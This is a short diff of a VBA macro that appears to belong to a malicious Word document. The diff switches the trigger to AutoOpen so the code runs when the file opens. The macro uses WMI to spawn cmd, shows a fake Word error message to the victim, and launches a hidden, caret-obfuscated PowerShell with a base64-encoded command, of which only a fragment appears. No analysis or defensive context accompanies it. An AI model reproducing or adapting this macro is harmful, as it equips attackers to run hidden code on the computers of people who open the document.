@@ -1,4 +1,4 @@
-Private Sub Document_Open()
+Sub AutoOpen()
 
 Set a = GetObject("winmgmts:Win32_ProcessStartup")
 Set config = a.SpawnInstance_
@@ -11,6 +11,3 @@ commandStringB64 = commandStringB64 + "wARQAgACsAJwBcAEQAbwBjAHUAbQBlAG4AdABzAFw
 returnV = b.Create("cmd cmd cmd cmd  /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -encodedCommand  " & commandStringB64, "C:\Users\", config, processID)
 
 End Sub
-
-
-
